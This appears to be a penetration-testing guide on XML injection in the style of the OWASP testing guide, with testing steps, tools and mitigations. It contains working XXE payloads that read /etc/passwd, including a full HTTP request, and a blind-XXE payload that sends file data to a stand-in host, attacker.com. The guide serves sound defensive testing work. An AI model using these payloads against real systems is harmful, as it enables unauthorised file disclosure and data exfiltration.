# WSTG-INPV-14: Testing for XML Injection

## Summary
XML Injection occurs when an attacker injects malicious XML data into an application that parses XML documents. This can lead to unauthorized data access, information disclosure, or denial of service.

---

## Objectives
- Identify input points that allow XML injection.
- Test for injection vulnerabilities by manipulating XML data.
- Assess the impact of exploiting the vulnerability.

---

## How to Test

### Manual Testing

1. **Identify Input Points:**
   - Locate areas of the application where XML data is processed, such as:
     - APIs accepting XML payloads.
     - Web services using SOAP or REST with XML.
     - File upload functionalities.

2. **Inject Malicious XML Data:**
   - Test with malicious payloads to manipulate the XML structure:
     ```xml
     <!DOCTYPE foo [
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <root>
       <data>&xxe;</data>
     </root>
     ```
   - Example request:
     ```http
     POST /api/upload HTTP/1.1
     Content-Type: application/xml

     <?xml version="1.0"?>
     <!DOCTYPE foo [
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <root>
       <data>&xxe;</data>
     </root>
```     

3. **Observe Application Behavior:**
   - Check for unexpected outputs, such as file content or error messages.
   - Analyze responses to confirm whether injected XML is processed.

4. **Test for Blind XXE:**
   - Use out-of-band interactions to confirm XXE vulnerabilities:
     ```xml
     <!DOCTYPE foo [
       <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">
     ]>
     <root>
       <data>&xxe;</data>
     </root>
     ```

---

### Automated Testing

Use tools like:
- **Burp Suite Extensions:** Test for XML injection using specific payloads.
- **OWASP ZAP:** Scan for XML injection vulnerabilities.
- **XXEinjector:** Detect and exploit XXE vulnerabilities.

---

## Mitigation
- Disable external entity processing (XXE) in XML parsers by default.
- Validate and sanitize all XML input.
- Use XML libraries that are resistant to XXE attacks.
- Enforce strict schemas for XML documents.
- Monitor and log XML parsing activities for unusual behavior.

---

## References
- OWASP XXE Prevention Cheat Sheet
- CWE-611: Improper Restriction of XML External Entity Reference ('XXE')
- Tools:
  - [Burp Suite Extensions](https://portswigger.net/bappstore)
  - [XXEinjector](https://github.com/enjoiz/XXEinjector)
  - [OWASP ZAP](https://www.zaproxy.org/)
